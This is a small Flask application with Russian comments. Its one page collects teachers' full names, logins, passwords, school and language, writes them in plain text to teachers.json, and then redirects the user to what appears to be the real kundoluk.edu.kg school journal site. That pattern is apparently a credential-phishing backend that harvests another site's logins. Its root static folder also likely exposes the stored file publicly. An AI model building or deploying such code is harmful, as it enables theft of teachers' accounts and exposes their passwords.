from flask import Flask, render_template, request, redirect
import json, os
from datetime import datetime

# указываем, что шаблоны (и статические файлы) — в корне
app = Flask(
    __name__,
    template_folder='.',  # шаблоны рядом с app.py
    static_folder='.'     # если у вас есть стили/скрипты в корне
)

DATA_FILE = 'teachers.json'

def load_data():
    if not os.path.exists(DATA_FILE):
        return []
    try:
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            return data if isinstance(data, list) else []
    except json.JSONDecodeError:
        return []


def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

@app.route('/', methods=['GET', 'POST'])
def confirm():
    if request.method == 'POST':
        entry = {
            "fio":      request.form['fio'],
            "login":    request.form['login'],
            "password": request.form['password'],
            "school":   request.form['school'],
            "language": request.form['language'],
            "agreed":   bool(request.form.get('agree')),
            "ts":       datetime.utcnow().isoformat()
        }
        data = load_data()
        data.append(entry)
        save_data(data)
        # при удачной отправке — редирект на внешний сайт
        return redirect("https://kundoluk.edu.kg/")
    # при GET отдадим index.html из корня
    return render_template('index.html')

if __name__ == '__main__':
    # в продакшне не запускайте так, а через WSGI-сервер
    app.run(port=5000)